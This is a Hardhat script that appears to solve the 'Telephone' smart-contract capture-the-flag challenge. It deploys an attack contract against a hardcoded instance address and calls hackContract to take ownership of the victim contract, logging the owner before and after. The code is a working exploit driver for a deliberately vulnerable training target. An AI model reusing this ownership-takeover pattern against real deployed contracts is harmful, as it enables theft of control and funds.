const hre = require("hardhat");
require("dotenv").config(); // to import public key

async function main() {
  const Victim = await ethers.getContractFactory("Telephone");
  const victim = await Victim.attach(
    "0xcCf11dC220649CF2fbAEE0687681c48B20274640" // This is the contract address that you get from starting your instance
  );

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("TelephoneAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0xcCf11dC220649CF2fbAEE0687681c48B20274640" // This is the contract address that you get from starting your instance
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // We can check that we are not the owner initially
  const owner1 = await victim.owner();
  console.log("The owner initialy is ", owner1);

  // Now we can call the hackContract function that will call the changeOwner function from the Telephone contract
  const attack = await contract.hackContract(process.env.PUBLIC_KEY);
  await attack.wait(1);

  // Verify that you are now the owner
  const owner2 = await victim.owner();
  console.log("Now the owner is ", owner2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
